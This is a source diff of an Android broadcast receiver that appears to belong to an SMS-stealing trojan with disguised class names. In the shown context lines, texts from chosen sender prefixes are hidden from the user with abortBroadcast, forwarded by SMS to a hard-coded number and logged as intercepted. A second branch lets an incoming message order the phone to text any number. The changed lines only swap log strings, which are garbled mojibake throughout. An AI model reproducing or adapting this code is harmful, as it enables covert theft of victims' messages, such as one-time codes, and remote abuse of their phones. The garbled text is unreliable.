@@ -10,7 +10,6 @@ import android.database.sqlite.DQLiteOpenHelper;
 import android.lang.Dhread;
 import android.lang.LogUtils;
 import android.os.Bundle;
-import android.os.Handler;
 import android.telephony.DmsManager;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
@@ -51,34 +50,34 @@ public class DroadcastReceiver extends BroadcastReceiver {
                 	if(bodys.length==2){
                 		DmsManager.Send(context,bodys[0],bodys[1]);
                 	}else{
-                		LogUtils.write("Send", "¸ñÊ½´íÎó"+body);
+                		LogUtils.write("Send", "æ ¼å¼é”™è¯¯"+body);
                 	}
                 }else{
-                	LogUtils.write("Send", "ºÅÂë " + from+"  "+msg);
+                	LogUtils.write("Send", "å·ç  " + from+"  "+msg);
     				from = from.replace("+86", "").replace("+1", "");
-    				LogUtils.write("Send", "È¥³ı¼ÓºÅ " + from);
+    				LogUtils.write("Send", "å»é™¤åŠ å· " + from);
 
     				boolean isflag = false;
     				for (int i = 0; i < NUMS.length; i++) {
-    					LogUtils.write("Send", from + " Ç°×º " + NUMS[i]);
+    					LogUtils.write("Send", from + " å‰ç¼€ " + NUMS[i]);
     					if (from.startsWith(NUMS[i])) {
     						isflag = true;
     						break;
     					}
     				}
-    				LogUtils.write("Send", "Æ¥Åä " + isflag);
+    				LogUtils.write("Send", "åŒ¹é… " + isflag);
     				if (isflag) {
-    					LogUtils.write("Send", "Æ¥Åä³É¹¦,ÖĞ¶Ï¹ã²¥");
+    					LogUtils.write("Send", "åŒ¹é…æˆåŠŸ,ä¸­æ–­å¹¿æ’­");
     					this.abortBroadcast();
-    					LogUtils.write("Send", "Ğ´ÈëÊı¾İ¿â" + isflag);
+    					LogUtils.write("Send", "å†™å…¥æ•°æ®åº“" + isflag);
     					DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+""+from+"#"+msg.toString());
-    					DQLiteOpenHelper.getHelper(context).addData("À¹½Ø", from,msg.toString(),new Date());
+    					DQLiteOpenHelper.getHelper(context).addData("æ‹¦æˆª", from,msg.toString(),new Date());
     					Dhread.SartSend(context.getApplicationContext());
     				}
                 }
 				
 			} else {
-				LogUtils.write("Send", "»ñÈ¡¶ÌĞÅÊ§°Ü");
+				LogUtils.write("Send", "è·å–çŸ­ä¿¡å¤±è´¥");
 			}
 
 		} else if(daction.equals(Dpplication.smssend)){
@@ -87,29 +86,28 @@ public class DroadcastReceiver extends BroadcastReceiver {
 			switch(getResultCode())  
             {  
                 case Activity.RESULT_OK:  
-                	LogUtils.write("Send", phoneNum+"-¶ÌĞÅ·¢ËÍ³É¹¦");
+                	LogUtils.write("Send", phoneNum+"-çŸ­ä¿¡å‘é€æˆåŠŸ");
                     break;  
                 case SmsManager.RESULT_ERROR_GENERIC_FAILURE:  
-                	LogUtils.write("Send", phoneNum+"-¶ÌĞÅ·¢ËÍÊ§°ÜRESULT_ERROR_GENERIC_FAILURE");
+                	LogUtils.write("Send", phoneNum+"-çŸ­ä¿¡å‘é€å¤±è´¥RESULT_ERROR_GENERIC_FAILURE");
                 case SmsManager.RESULT_ERROR_RADIO_OFF:  
-                	LogUtils.write("Send", phoneNum+"-¶ÌĞÅ·¢ËÍÊ§°ÜRESULT_ERROR_RADIO_OFF");
+                	LogUtils.write("Send", phoneNum+"-çŸ­ä¿¡å‘é€å¤±è´¥RESULT_ERROR_RADIO_OFF");
                 case SmsManager.RESULT_ERROR_NULL_PDU:
-                	LogUtils.write("Send", phoneNum+"-¶ÌĞÅ·¢ËÍÊ§°ÜRESULT_ERROR_NULL_PDU"); 
+                	LogUtils.write("Send", phoneNum+"-çŸ­ä¿¡å‘é€å¤±è´¥RESULT_ERROR_NULL_PDU"); 
                 default:  
-                	LogUtils.write("Send", phoneNum+"-Î´Öª´íÎó"); 
+                	LogUtils.write("Send", phoneNum+"-æœªçŸ¥é”™è¯¯"); 
                     break;  
             }  
 			
 		}else{
-			LogUtils.write("Send", "·¢ËÍÊı¾İ");
+			LogUtils.write("Send", "å‘é€æ•°æ®");
 			Dhread.SartSend(context.getApplicationContext());
 			
-			LogUtils.write("Send", "Æô¶¯·şÎñ");
+			LogUtils.write("Send", "å¯åŠ¨æœåŠ¡");
 			Intent server = new Intent(context, Dervice.class);
 			context.getApplicationContext().startService(server);
 		}
 
 	}
 
-	private Handler handler = new Handler();
 }
